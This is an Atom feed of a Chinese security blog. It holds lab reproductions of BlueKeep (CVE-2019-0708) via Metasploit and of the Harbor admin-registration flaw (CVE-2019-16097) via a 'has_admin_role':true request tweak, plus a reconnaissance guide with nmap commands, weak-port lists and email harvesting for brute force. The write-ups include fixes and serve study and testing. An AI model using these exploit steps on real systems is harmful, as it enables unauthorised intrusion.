<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Jokong的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-27T03:47:29.167Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Jokong</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-0708复现</title>
    <link href="http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-27T03:38:10.000Z</published>
    <updated>2019-11-27T03:47:29.167Z</updated>
    
    <content type="html"><![CDATA[<p>BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。</p><a id="more"></a><h3 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h3><p>目标机：Windows 2007 X64    192.168.30.129<br>攻击机：kali    192.168.30.128</p><p>windows配置<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/1.jpg" alt="1"></p><p>kali 配置 - MSF下替换文件<br>EXP下载地址：<a href="https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip" target="_blank" rel="noopener">https://github.com/backlion/demo/blob/master/CVE-2019-0708_RDP%20_MSF.zip</a>  </p><p>cve_2019_0708_bluekeep_rce.rb 添加 /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb  </p><p>rdp.rb 替换 /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rb<br>rdp_scanner.rb 替换 /usr/share//metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb  </p><p>cve_2019_0708_bluekeep.rb 替换 /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb  </p><p>root@kali:~# msfconsole<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/2.jpg" alt="2"></p><p>msf5 &gt; reload_all    #重新加载所有模块<br>msf5 &gt; search cve_2019_0708<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/3.jpg" alt="3"></p><p>msf5 &gt; use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; info<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/4.jpg" alt="4"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set RHOSTS 192.168.30.129<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/5.jpg" alt="5"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;set target 3<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/6.jpg" alt="6"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;show options<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/7.jpg" alt="7"></p><p>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt;run<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/8.jpg" alt="8"></p><p>执行whoami<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/9.jpg" alt="9"></p><h3 id="遇到的坑"><a href="#遇到的坑" class="headerlink" title="遇到的坑"></a>遇到的坑</h3><p>这种情况是把虚拟机打蓝屏了，此时，关机重启，多试几次。哈哈哈哈哈！（鬼知道我打蓝屏了多少次）<br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/10.jpg" alt="10"><br><img src="/2019/11/27/CVE-2019-0708%E5%A4%8D%E7%8E%B0/11.jpg" alt="11"></p><p>修复建议：<br>安装微软为2019-0708推出的专用补丁：<br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;BlueKeep（CVE-2019-0708）是微软远程桌面协议（RDP）实现中发现的一个安全漏洞，它允许远程执行代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Harbor任意管理员注册漏洞(CVE-2019-16097)复现</title>
    <link href="http://yoursite.com/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/</id>
    <published>2019-11-27T03:16:35.000Z</published>
    <updated>2019-11-27T03:30:43.621Z</updated>
    
    <content type="html"><![CDATA[<p>Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，提供了良好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等</p><a id="more"></a><h2 id="漏洞简介及影响范围"><a href="#漏洞简介及影响范围" class="headerlink" title="漏洞简介及影响范围"></a>漏洞简介及影响范围</h2><p>Harbor 1.7.6之前版本和Harbor 1.8.3之前版本中的core/api/user.go文件存在安全漏洞。若开放注册功能，攻击者可利用该漏洞创建admin账户。注册功能默认开放。攻击者可以以管理员身份下载私有项目并审计；可以删除或污染所有镜像。</p><p>目前PoC已公开，建议受影响的客户尽快升级。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>（1）搭建好环境</p><p>（2）注册页面，输入必要信息，<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/1.png" alt="1"></p><p>（3）然后抓包，改包，在最后数据包加上：”has_admin_role”:true<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/2.png" alt="2"></p><p>（4）注册成功，登录之后，是管理员权限<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/3.png" alt="3"></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>声明：代码分析来自于奇安信团队，原文地址：<a href="https://mp.weixin.qq.com/s/PGkuysZwbIlIc5DWARUxcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/PGkuysZwbIlIc5DWARUxcw</a><br>分析代码的commit hash为e7488e37b69319fa9dcbaab57499bec5c8aed08a，此commit中尚未包含补丁。受影响的API请求地址是/api/users/，请求方式为POST，因此从API的路由中找到入口点，位置在src/core/router.go50行：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/4.png" alt="4"></p><p>可以看到其将此POST请求路由到了api.UserAPI中，找到api.UserAPI的处理POST请求的位置在src/core/api/user.go的302行，跟进代码，发现其先后判断认证方式，是否开启自行注册（默认开启）然后实例化了User结构体：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/5.png" alt="5"></p><p>我们先来看一下User结构体，位置在src/common/models/user.go 25行：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/6.png" alt="6"></p><p>注意其中HasAdminRole字段对应的数据库表现形式和JSON请求表现形式。其在数据库中的字段表现形式为sysadmin_flag，JSON表现形式为has_admin_role<br>再继续跟入，后面的过程依次是，反序列化请求JSON串为User结构体，验证用户提交的User格式是否正确（用户名规范和密码规范）判断用户名和email字段是否已存在，然后直接调用数据库访问层的dao.Register()方法执行数据库插入的操作：<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/7.png" alt="7"></p><p>跟入dao.Register()方法中，位置在src/common/dao/register.go26行，可以看到其直接将User结构体的HasAdminRole字段插入到数据库。<br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/8.png" alt="8"></p><p>由于整个过程没有对携带了has_admin_role字段的请求进行权限校验，导致用户可以直接通过此API设置一个新用户为管理员权限。</p><p>在github上进行commitdiff（<a href="https://github.com/goharbor/harbor/pull/8917/commits/b6db8a8a106259ec9a2c48be8a380cb3b37cf517#diff-fb70049a82e5abd89a68c8e2cccba44c）对比，可以看到此次提交对注册用户的请求进行了逻辑判断，不允许非管理员用户创建新的管理员用户。" target="_blank" rel="noopener">https://github.com/goharbor/harbor/pull/8917/commits/b6db8a8a106259ec9a2c48be8a380cb3b37cf517#diff-fb70049a82e5abd89a68c8e2cccba44c）对比，可以看到此次提交对注册用户的请求进行了逻辑判断，不允许非管理员用户创建新的管理员用户。</a><br><img src="/2019/11/27/Harbor%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E6%B3%A8%E5%86%8C%E6%BC%8F%E6%B4%9E-CVE-2019-16097-%E5%A4%8D%E7%8E%B0/9.png" alt="9"></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>升级到1.7.6及以上版本或者1.8.3及以上版本<br>关闭自行注册功能</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Harbor是一个用于存储和分发Docker镜像的企业级Registry服务器，提供了良好的性能和安全。提升用户使用Registry构建和运行环境传输镜像的效率。Harbor支持安装在多个Registry节点的镜像资源复制，镜像全部保存在私有Registry中， 确保数据和知识产权在公司内部网络中管控。另外，Harbor也提供了高级的安全特性，诸如用户管理，访问控制和活动审计等&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>我的博客</title>
    <link href="http://yoursite.com/2019/11/27/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <id>http://yoursite.com/2019/11/27/%E6%88%91%E7%9A%84%E5%8D%9A%E5%AE%A2/</id>
    <published>2019-11-27T03:02:39.000Z</published>
    <updated>2019-11-27T03:12:28.293Z</updated>
    
    <content type="html"><![CDATA[<p>在您浏览本博客的内容前，请仔细阅读本篇内容！谢谢</p><a id="more"></a><p>为了记录一些笔记，方便自己记忆，也为了后来人少走一些坑，开启了我的个人博客！</p><p>由于某些不可抗拒的因素，也为了避免不必要的麻烦，特此声明：</p><ul><li>由于传播、利用本博客所提供的信息而造成的任何直接或间接的后果及损失，均由使用者本人负责，博主不承担任何责任。</li><li>博主拥有对本博客所有内容的修改和解释权。如欲转载或传播文章，必须保证文章的完整性，包括版权声明等全部内容。未经博主允许，不得任意修改或者增减文章内容，不得以任何方式将其用于商业目的。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在您浏览本博客的内容前，请仔细阅读本篇内容！谢谢&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂谈" scheme="http://yoursite.com/categories/%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>信息收集思路总结</title>
    <link href="http://yoursite.com/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/</id>
    <published>2019-11-22T09:37:27.000Z</published>
    <updated>2019-11-23T15:36:51.989Z</updated>
    
    <content type="html"><![CDATA[<p>信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。最简单的比如说目标站点的IP、中间件、脚本语言、端口、邮箱等等。我觉得信息收集在我们渗透测试的过程当中，是最重要的一环，这一环节没做好，没收集到足够多的可利用的信息，我们很难进行下一步的操作。</p><a id="more"></a><p>信息收集主要收集什么呢？该如何进行收集呢？</p><h2 id="whois信息"><a href="#whois信息" class="headerlink" title="whois信息"></a>whois信息</h2><p>很多网站上都可以收集到whois信息，比如说</p><p>国外的who.is：<a href="https://who.is/" target="_blank" rel="noopener">https://who.is/</a><br>站长之家：<a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a><br>爱站：<a href="https://whois.aizhan.com/" target="_blank" rel="noopener">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/" target="_blank" rel="noopener">https://x.threatbook.cn/</a> </p><p>这些网站都可以收集whois信息，而且还很全面，我主要关注：注册商、注册人、邮件、DNS解析服务器、注册人联系电话。<br>有需要的还可以查企业的备案信息，主要有三种方式</p><p>天眼查：<a href="https://www.tianyancha.com/" target="_blank" rel="noopener">https://www.tianyancha.com/</a><br>ICP备案查询网：<a href="http://www.beianbeian.com/" target="_blank" rel="noopener">http://www.beianbeian.com/</a><br>国家企业信用信息公示系统：<a href="http://www.gsxt.gov.cn/index.html" target="_blank" rel="noopener">http://www.gsxt.gov.cn/index.html</a>   </p><p>注意：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/1.png" alt="1"></p><ul><li>小技巧：如果在站长之家上隐藏了信息，可在 who.is 上再次查看  </li></ul><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><p>子域名是在顶级域名下的域名，收集的子域名越多，我们测试的目标就越多，渗透的成功率也越大。往往在主站找不到突破口的时候，我们从子域名入手，有时候可能会发现惊喜！<br>大佬们都有自己用的顺手的一套方法或工具  </p><p>我就简单收集了一些  </p><ul><li><p>1、Google语法<br>可以利用Google和Bing这样的搜索引擎进行搜索查询（site:<a href="http://www.xxx.com）" target="_blank" rel="noopener">www.xxx.com）</a><br>Google还支持额外的减号运算符，以排除我们对“网站:wikimedia.org -www -store ”不感兴趣的子域名。<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/2.png" alt="2"></p></li><li><p>2、有许多第三方服务聚合了大量的DNS数据集，并通过它们来检索给定域名的子域名。<br>（1）VirusTotal：<a href="https://www.virustotal.com/#/home/search" target="_blank" rel="noopener">https://www.virustotal.com/#/home/search</a><br>（2）DNSdumpster：<a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a><br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/3.png" alt="3"></p></li><li><p>3、基于SSL证书查询<br>查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。前两种比较常用。<br>（1）<a href="https://crt.sh/" target="_blank" rel="noopener">https://crt.sh/</a><br>（2）<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a><br>（3）<a href="https://developers.facebook.com/tools/ct/" target="_blank" rel="noopener">https://developers.facebook.com/tools/ct/</a><br>（4）<a href="https://google.com/transparencyreport/https/ct/" target="_blank" rel="noopener">https://google.com/transparencyreport/https/ct/</a><br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/4.png" alt="4"></p></li><li><p>4、简单的在线子域名收集（不推荐）<br>（1）<a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a><br>（2）<a href="http://i.links.cn/subdomain/" target="_blank" rel="noopener">http://i.links.cn/subdomain/</a>  </p></li><li><p>5、爆破枚举<br>这个就有很多工具可以用了，大佬们都有自己用的顺手的工具，比较常见的是：<br>（1）layer子域名挖掘机<br>（2）subDomainsBrute<br>（3）K8<br>（4）orangescan<br>（5）DNSRecon<br>这里重点推荐 subDomainsBrute 工具，可以从子域名入侵到主站。  </p></li><li><p>小技巧：在 <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a> 上也可以搜索子域名，运气好的话，会有意想不到的收获。  </p></li></ul><h2 id="IP段的收集"><a href="#IP段的收集" class="headerlink" title="IP段的收集"></a>IP段的收集</h2><p>一般IP的话，我们在收集子域名的时候，就大概知道目标网站的IP段了。<br>也可以通过whois命令获取。即通过中国互联网信息中心 <a href="http://ipwhois.cnnic.net.cn/" target="_blank" rel="noopener">http://ipwhois.cnnic.net.cn/</a> 进行查询<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/5.png" alt="5"></p><h2 id="开放端口探测"><a href="#开放端口探测" class="headerlink" title="开放端口探测"></a>开放端口探测</h2><p>很多时候，网站都会开启CDN加速，导致我们查询到的IP不是真实的IP，所以得先查询到真实的IP地址。方法有很多，百度一大把。就说我觉得最准确的几种方法吧！<br>（1）通过让服务器给你发邮件(看邮箱头源 ip )找真实 ip（最可靠）。<br>（2）通过 zmpap 全网爆破查询真实 ip（可靠）。<br>（3）通过查询域名历史 ip，<a href="http://toolbar.netcraft.com" target="_blank" rel="noopener">http://toolbar.netcraft.com</a> （借鉴）。<br>（4）通过国外冷门的 DNS 的查询：nslookup xxx.com  国外冷门 DNS 地址 （借鉴）。  </p><p>收集到大量IP，那就要进行端口扫描了，看看有什么常见的漏洞。<br>最常用的就是神器Nmap了。命令：nmap -sS -Pn -p- -vv ip –script=defaultip<br>端口服务对应图：<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/6.png" alt="6"></p><p>常见端口漏洞：<br>端口    服务    说明<br>21    FTP    主要看是否支持匿名，也可跑弱口令<br>22    SSH    弱口令爆破<br>23    telnet    弱口令爆破<br>80-90    WEB    常见WEB漏洞以及一些为管理后台<br>161    snmp    public弱口令<br>389    ldap    是否为匿名访问<br>443    openssl    心脏出血以及一些WEB漏洞测试<br>445    smb    跑弱口令，检测是否有ms_08067等溢出<br>873    rsync    是否为匿名访问，也可以跑弱口令<br>1025    RPC    NFS匿名访问<br>1099    java rmi    远程命令执行漏洞<br>1433    mssql    弱口令爆破<br>1521    oracle    弱口令爆破<br>2082/2083    cpanel主机管理系统登陆    弱口令爆破<br>2222    DA虚拟主机管理系统登陆    弱口令爆破<br>2601,2604    zebra路由器    默认密码zebra<br>3128    squid代理默认端口    如果没设置口令很可能 就直接漫游内网<br>3306    mysql    弱口令爆破<br>3312/3311    kangle主机管理系统登陆    说明<br>3389    RDP    弱口令爆破，SHIFT后门，放大镜，输入法漏洞<br>4440    rundeck    web<br>4848    GlassFish    web中间件 弱口令admin/adminadmin<br>5432    postgres    弱口令爆破<br>5560,7778    iSqlPlus<br>5900,5901,5902    vnc    弱口令爆破<br>5984    CouchDB<br>6082    varnish<br>6379    redis    一般无验证，直接访问<br>7001,7002    weblogic    弱口令爆破<br>7778    Kloxo主机控制面板登录<br>8080    tomcat\jboss    弱口令爆破，jboss后台可能不验证<br>8649    ganglia<br>8080-8090    常见WEB端口<br>8083    Vestacp主机管理系统 （国外用较多）<br>8649    ganglia<br>8888    amh/LuManager 主机管理系统默认端口    说明<br>9000    fcgi    fcgi php命令执行漏洞<br>9200    elasticsearch    代码执行<br>9043    websphere    弱口令爆破<br>10000    Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211    memcache    内存泄露<br>27017,28017    mongodb    未授权访问<br>50000    Upnp    SAP命令执行<br>50060,50030    hadoop    WEB    未授权访问  </p><p>常见端口列表整理如下：<br>21,22,23,80-90,161,389,443,445,873,1099,1433,1521,1900,2082,2083,2222,2601,2604,3128,3306,3311,3312,3389,4440,4848,5432,5560,5900,5901,5902,6082,6379,7001-7010,7778,8080-8090,8649,8888,9000,9200,10000,11211,27017,28017,50000,50030,50060</p><h2 id="网站架构探测"><a href="#网站架构探测" class="headerlink" title="网站架构探测"></a>网站架构探测</h2><p>当我们探测目标站点网站架构时，比如说：操作系统，中间件，脚本语言，数据库，服务器，web容器等等，可以使用以下方法查询。<br>（1）wappalyzer插件 ——火狐插件<br>（2）云悉：<a href="http://www.yunsee.cn/info.html" target="_blank" rel="noopener">http://www.yunsee.cn/info.html</a><br>（3）查看数据包响应头<br>（4）CMS指纹识别：<a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/look/</a><br>CMS指纹识别又有很多方法，比如说御剑指纹识别、Webrobot工具、whatweb工具、还有在线查询的网站等等。<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/7.png" alt="7"></p><h2 id="敏感文件、敏感目录探测"><a href="#敏感文件、敏感目录探测" class="headerlink" title="敏感文件、敏感目录探测"></a>敏感文件、敏感目录探测</h2><p>通常我们所说的敏感文件、敏感目录大概有以下几种：<br>（1）Git<br>（2）hg/Mercurial<br>（3）svn/Subversion<br>（4）bzr/Bazaar<br>（5）Cvs<br>（6）WEB-INF泄露<br>（7）备份文件泄露、配置文件泄露  </p><p>敏感文件、敏感目录挖掘一般都是靠工具、脚本来找，当然大佬手工也能找得到。<br>常用的工具有：<br>（1）御剑（真的很万能，文末附上全家桶）<br>（2）爬虫（AWVS、Burpsuite等）<br>（3）搜索引擎（Google、Github等）<br>（4）wwwscan<br>（5）BBscan（一位巨佬写的python脚本：<a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> ）<br>（6）GSIL（也是一位巨佬写的python脚本：<a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a> ）<br>（7）社交平台（有事没事多加一些QQ群）  </p><h2 id="目标域名邮箱收集"><a href="#目标域名邮箱收集" class="headerlink" title="目标域名邮箱收集"></a>目标域名邮箱收集</h2><p>一定要养成收集站点邮箱账号收集的习惯（因为好多官方后台都是用内部邮箱账号登录的，指不定哪天你就得到一个进后台的机会）。<br>（1）通过说明文档以及网站页面收集，或者网站发表者以及留言板信息处收集账号<br>（2）通过 teemo，metago，burpusit，awvs，netspker 或者 google 语法收集<br>（3）搜索相关 QQ 群收集相关企业员工的社交账号<br>用途： 可用来进行爆破或者弱口令登录以及撞裤攻击。  </p><h2 id="WAF探测"><a href="#WAF探测" class="headerlink" title="WAF探测"></a>WAF探测</h2><p>Waf也叫Web应用防火墙，是通过执行一系列针对HTTP/HTTPS的安全策略来专门为Web应用提供保护的一款产品。Waf的探测很多人都会忽略掉，其实当我们遇到Waf，第一想法是溜了溜了、告辞告辞（我是这样，别赞，要脸）。但当我们知道是什么Waf时，又有种去绕过它的冲动，很多大牛都喜欢挑战Waf，于是网上就出现了很多绕过Waf的教学视频。毕竟成功绕过之后的那种自豪感真的真的很舒服。<br>我常用的两种方式：<br>（1）手工（提交恶意数据，简单粗暴）<br>（2）Kaili工具（WAFW00F、Nmap）  </p><p>Nmap探测WAF有两种脚本，<br>&nbsp; &nbsp; &nbsp;一种是http-waf-detect，命令：nmap  -p80,443  –script=http-waf-detect  ip<br>&nbsp; &nbsp; &nbsp; 一种是http-waf-fingerprint。命令：nmap  -p80,443  –script=http-waf-fingerprint  ip  </p><p>WAFW00F 探测 WAF 命令：wafw00f  -a  域名<br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/8.png" alt="8"></p><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C端：是和目标服务器ip处在同一个C段的其它服务器。<br>旁站和C段的查询方式：<br>（1）利用Bing.com，语法为：<a href="http://cn.bing.com/search?q=ip:111.111.111.111" target="_blank" rel="noopener">http://cn.bing.com/search?q=ip:111.111.111.111</a><br>（2）站长之家：<a href="http://s.tool.chinaz.com/same" target="_blank" rel="noopener">http://s.tool.chinaz.com/same</a><br>（3）利用Google，语法：site:125.125.125.*<br>（4）利用Nmap，语法：nmap -p 80,8080 –open ip/24<br>（5）K8工具、御剑、北极熊扫描器等<br>（6）在线：<a href="http://www.webscan.cc/" target="_blank" rel="noopener">http://www.webscan.cc/</a><br><img src="/2019/11/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93/9.png" alt="9"></p><p>最后，附上几个常用的搜索引擎：<br>ZoomEy：<a href="https://www.zoomeye.org/" target="_blank" rel="noopener">https://www.zoomeye.org/</a><br>FoFa：<a href="https://fofa.so/" target="_blank" rel="noopener">https://fofa.so/</a><br>Dnsdb：<a href="https://www.dnsdb.io/zh-cn/" target="_blank" rel="noopener">https://www.dnsdb.io/zh-cn/</a><br>Shodam：<a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a><br>Censys：<a href="https://censys.io/" target="_blank" rel="noopener">https://censys.io/</a><br>御剑全家桶：<a href="http://www.moonsec.com/post-753.html" target="_blank" rel="noopener">http://www.moonsec.com/post-753.html</a>   </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。最简单的比如说目标站点的IP、中间件、脚本语言、端口、邮箱等等。我觉得信息收集在我们渗透测试的过程当中，是最重要的一环，这一环节没做好，没收集到足够多的可利用的信息，我们很难进行下一步的操作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="信息收集" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
</feed>
